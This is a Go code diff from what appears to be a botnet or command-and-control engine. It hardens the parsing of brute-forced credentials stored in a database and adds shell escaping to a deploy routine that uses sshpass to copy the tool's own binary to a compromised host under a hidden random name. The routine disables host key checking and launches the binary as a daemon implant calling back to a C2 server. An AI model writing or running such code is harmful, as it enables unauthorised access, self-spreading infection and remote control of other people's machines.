@@ -268,14 +268,29 @@ func (e *Engine) parseBruteResults(campID, botID, output string) {
 		if !strings.HasPrefix(line, "CRED_FOUND:") {
 			continue
 		}
-		parts := strings.SplitN(line, ":", 5)
-		if len(parts) < 5 {
+		// Format: CRED_FOUND:user:pass:target:port
+		// Parse port from end to handle IPv6 targets containing colons
+		rest := line[len("CRED_FOUND:"):]
+		lastColon := strings.LastIndex(rest, ":")
+		if lastColon < 0 {
 			continue
 		}
-		username := parts[1]
-		password := parts[2]
-		target := parts[3]
-		port := parts[4]
+		port := rest[lastColon+1:]
+		rest = rest[:lastColon]
+
+		secondLastColon := strings.LastIndex(rest, ":")
+		if secondLastColon < 0 {
+			continue
+		}
+		target := rest[secondLastColon+1:]
+		rest = rest[:secondLastColon]
+
+		firstColon := strings.Index(rest, ":")
+		if firstColon < 0 {
+			continue
+		}
+		username := rest[:firstColon]
+		password := rest[firstColon+1:]
 
 		e.db.Exec(`
 			INSERT INTO credentials (username, password, target, port, service, valid)
@@ -302,6 +317,8 @@ func (e *Engine) deployAgent(campID, botID, user, pass, target, port string) {
 		return
 	}
 
+	escapedPass := strings.ReplaceAll(pass, "'", "'\\''")
+	escapedUser := strings.ReplaceAll(user, "'", "'\\''")
 	payload := fmt.Sprintf(`SELF=$(readlink -f /proc/self/exe 2>/dev/null)
 if [ -z "$SELF" ] || [ ! -f "$SELF" ]; then echo "DEPLOY_FAILED:cannot_locate_binary"; exit 1; fi
 RNAME=".$(head -c 4 /dev/urandom | od -A n -t x1 | tr -d ' \n')"
@@ -315,12 +332,12 @@ sshpass -p '%s' scp -o StrictHostKeyChecking=no -o ConnectTimeout=10 -P %s "$SEL
 if [ $? -ne 0 ]; then echo "DEPLOY_FAILED:scp_error:%s:%s"; exit 1; fi
 sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p %s '%s@%s' "chmod +x $RPATH && nohup $RPATH --server '%s' --implant-key '%s' --interval 10s --jitter 2s --daemon >/dev/null 2>&1 & echo AGENT_PID=\$!" 2>&1
 echo "DEPLOYED:%s@%s:%s:$RPATH"`,
-		user, target, port,
-		pass, port, user, target,
+		escapedUser, target, port,
+		escapedPass, port, escapedUser, target,
 		target, port,
-		pass, port, user, target,
+		escapedPass, port, escapedUser, target,
 		e.c2URL, e.implantKey,
-		user, target, port,
+		escapedUser, target, port,
 	)
 
 	task := TaskTemplate{
